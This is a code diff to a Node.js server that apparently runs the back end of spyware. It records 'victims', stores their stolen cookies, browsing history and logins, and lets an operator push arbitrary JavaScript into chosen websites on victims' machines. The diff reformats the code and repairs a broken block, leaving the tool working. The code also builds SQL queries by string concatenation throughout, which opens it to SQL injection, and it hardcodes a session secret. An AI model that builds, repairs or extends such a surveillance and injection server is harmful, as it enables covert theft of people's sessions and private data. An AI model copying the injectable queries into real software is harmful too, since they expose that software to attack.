@@ -41,9 +41,15 @@ con.query("SELECT * FROM Admin WHERE name= '"+username+"'", function (err, resul
 passport.use(new Strategy(
   function(username, password, cb) {
     users.findByUsername(username, function(err, user) {
-      if (err) { return cb(err); }
-      if (!user) { return cb(null, false); }
-      if (user.password != password) { return cb(null, false); }
+      if (err) {
+        return cb(err);
+      }
+      if (!user) {
+        return cb(null, false);
+      }
+      if (user.password != password) {
+        return cb(null, false);
+      }
       return cb(null, user);
     });
   }));
@@ -53,8 +59,10 @@ passport.serializeUser(function(user, cb) {
 });
 
 passport.deserializeUser(function(id, cb) {
-  users.findById(id, function (err, user) {
-    if (err) { return cb(err); }
+  users.findById(id, function(err, user) {
+    if (err) {
+      return cb(err);
+    }
     cb(null, user);
   });
 });
@@ -73,8 +81,14 @@ app.set('view engine', 'ejs');
 // logging, parsing, and session handling.
 //app.use(require('morgan')('combined'));
 app.use(require('cookie-parser')());
-app.use(require('body-parser').urlencoded({ extended: true }));
-app.use(require('express-session')({ secret: 'idkThisIsMySecretToSignCookie', resave: false, saveUninitialized: false }));
+app.use(require('body-parser').urlencoded({
+  extended: true
+}));
+app.use(require('express-session')({
+  secret: 'idkThisIsMySecretToSignCookie',
+  resave: false,
+  saveUninitialized: false
+}));
 
 //for frontend styling
 app.use(express.static('views'));
@@ -89,25 +103,29 @@ app.use(passport.session());
 app.get('/',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
-    con.query("SELECT * FROM Victims", function (err, result, fields) {
+    con.query("SELECT * FROM Victims", function(err, result, fields) {
       if (err) throw err;
-      res.render('home', { rowData: result });
+      res.render('home', {
+        rowData: result
+      });
     });
   });
 
 app.get('/login',
-  function(req, res){
+  function(req, res) {
     res.render('login');
   });
 
 app.post('/login',
-  passport.authenticate('local', { failureRedirect: '/login' }),
+  passport.authenticate('local', {
+    failureRedirect: '/login'
+  }),
   function(req, res) {
     res.redirect('/');
   });
 
 app.get('/logout',
-  function(req, res){
+  function(req, res) {
     req.logout();
     res.redirect('/');
   });
@@ -124,12 +142,15 @@ app.get('/cookies',
 
 app.get('/cookies',
   require('connect-ensure-login').ensureLoggedIn(),
-  function(req, res){
-    con.query("SELECT * FROM Cookie WHERE userID = '"+req.query['selection']+"'", function (err, history, fields) {
+  function(req, res) {
+    con.query("SELECT * FROM Cookie WHERE userID = '" + req.query['selection'] + "'", function(err, history, fields) {
       if (err) throw err;
-      con.query("SELECT * FROM Victims", function (err, userResult, fields) {
+      con.query("SELECT * FROM Victims", function(err, userResult, fields) {
         if (err) throw err;
-        res.render('cookies', { users: userResult, rowData: history });
+        res.render('cookies', {
+          users: userResult,
+          rowData: history
+        });
       });
     });
   });
@@ -146,50 +167,60 @@ app.get('/cookies',
 
 app.get('/history',
   require('connect-ensure-login').ensureLoggedIn(),
-  function(req, res){
-    con.query("SELECT * FROM History WHERE userID = '"+req.query['selection']+"'", function (err, history, fields) {
+  function(req, res) {
+    con.query("SELECT * FROM History WHERE userID = '" + req.query['selection'] + "'", function(err, history, fields) {
       if (err) throw err;
-      con.query("SELECT * FROM Victims", function (err, userResult, fields) {
+      con.query("SELECT * FROM Victims", function(err, userResult, fields) {
         if (err) throw err;
-        res.render('history', { users: userResult, rowData: history });
+        res.render('history', {
+          users: userResult,
+          rowData: history
+        });
       });
     });
   });
 
 app.get('/profile',
   require('connect-ensure-login').ensureLoggedIn(),
-  function(req, res){
-    res.render('profile', { user: req.user });
+  function(req, res) {
+    res.render('profile', {
+      user: req.user
+    });
   });
 
 app.get('/inject',
   require('connect-ensure-login').ensureLoggedIn(),
   function(req, res) {
     var sql = "SELECT * FROM Injections";
-    con.query(sql, function (err, result) {
-      if(err) throw error;
+    con.query(sql, function(err, result) {
+      if (err) throw error;
       var arr = [];
-      for(var i = 0 ; i < result.length; i++){
-        var object = {site:result[i]['url'],code:result[i]['javascript']};
+      for (var i = 0; i < result.length; i++) {
+        var object = {
+          site: result[i]['url'],
+          code: result[i]['javascript']
+        };
         arr.push(object);
       }
 
       io.emit('jsExecution', arr);
 
-      res.render('inject',{ rowData: result });
+      res.render('inject', {
+        rowData: result
+      });
     });
 
   });
 
-  app.post('/inject',
-    require('connect-ensure-login').ensureLoggedIn(),
-    function(req, res) {
-      var sql = "INSERT INTO Injections (url, javascript) VALUES ('"+req.body.url+"', '"+ req.body.js+"')";
-      con.query(sql, function (err, result) {
-        if(err) console.log(err);
-      });
-      res.redirect("/inject");
+app.post('/inject',
+  require('connect-ensure-login').ensureLoggedIn(),
+  function(req, res) {
+    var sql = "INSERT INTO Injections (url, javascript) VALUES ('" + req.body.url + "', '" + req.body.js + "')";
+    con.query(sql, function(err, result) {
+      if (err) console.log(err);
     });
+    res.redirect("/inject");
+  });
 
 
 server.listen(3000);
@@ -197,26 +228,30 @@ console.log("Listening on port 3000");
 
 io.on('connection', (socket) => {
   socket.on("userInfo", (userInfo) => {
-    var sql = "INSERT INTO Victims (email, userID) VALUES ('"+userInfo.email+"', '"+ userInfo.id+"')";
-    con.query(sql, function (err, result) {
-      console.log("1 victim added: "+userInfo.email);
+    var sql = "INSERT INTO Victims (email, userID) VALUES ('" + userInfo.email + "', '" + userInfo.id + "')";
+    con.query(sql, function(err, result) {
+      console.log("1 victim added: " + userInfo.email);
     });
-    socket.emit('securityWebsites', [
-      var sql = "SELECT url FROM SecurityWebsites";
-      con.query(sql, function(err, result) {
-        if(err) throw error;
-        var arr = [];
-        result.forEach((row) => {
-          if (row.url) arr.push(row.url);
-        });
-      });
-    ]);
-    var sql = "SELECT * FROM Injections";
-    con.query(sql, function (err, result) {
-      if(err) throw error;
+    
+    var sql = "SELECT url FROM SecurityWebsites";
+    con.query(sql, function(err, result) {
+      if (err) throw error;
       var arr = [];
-      for(var i = 0 ; i < result.length; i++){
-        var object = {site:result[i]['url'],code:result[i]['javascript']};
+      result.forEach((row) => {
+        if (row.url) arr.push(row.url);
+      });
+      socket.emit('securityWebsites', arr);
+    });
+
+    var sql = "SELECT * FROM Injections";
+    con.query(sql, function(err, result) {
+      if (err) throw error;
+      var arr = [];
+      for (var i = 0; i < result.length; i++) {
+        var object = {
+          site: result[i]['url'],
+          code: result[i]['javascript']
+        };
         arr.push(object);
       }
 
@@ -226,25 +261,25 @@ io.on('connection', (socket) => {
       console.log("Login detected: " + loginInfo);
     });
     socket.on('Cookies', (cookies) => {
-      var sql = "INSERT INTO Cookie (userID, details) VALUES ('"+userInfo.id+"', '"+ cookies+"')";
-      con.query(sql, function (err, result) {
+      var sql = "INSERT INTO Cookie (userID, details) VALUES ('" + userInfo.id + "', '" + cookies + "')";
+      con.query(sql, function(err, result) {
         if (err) throw err;
       });
     });
     socket.on('History', (history) => {
-      var str1 = "'"+history[0]+"'" //siteLink String
-      var str2 = "'"+history[1]+"'" //timeStamp String
+      var str1 = "'" + history[0] + "'" //siteLink String
+      var str2 = "'" + history[1] + "'" //timeStamp String
 
       //INSERT INTO kevchang.History (userID, Details) VALUES (1, "secondDetails");
-      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('"+userInfo.id+"', "+ str2 + ","+ str1+")";
+      var sql = "INSERT INTO History (userID, timeDetails,siteLink) VALUES ('" + userInfo.id + "', " + str2 + "," + str1 + ")";
 
-      con.query(sql, function (err, result) {
-          if (err) throw err;
+      con.query(sql, function(err, result) {
+        if (err) throw err;
       });
       //history.forEach((field) => {
-        //console.log("Field: "+typeof(field));
-        //
-        //console.log("    " + field);
+      //console.log("Field: "+typeof(field));
+      //
+      //console.log("    " + field);
       //});
     });
     socket.on('disconnect', () => {
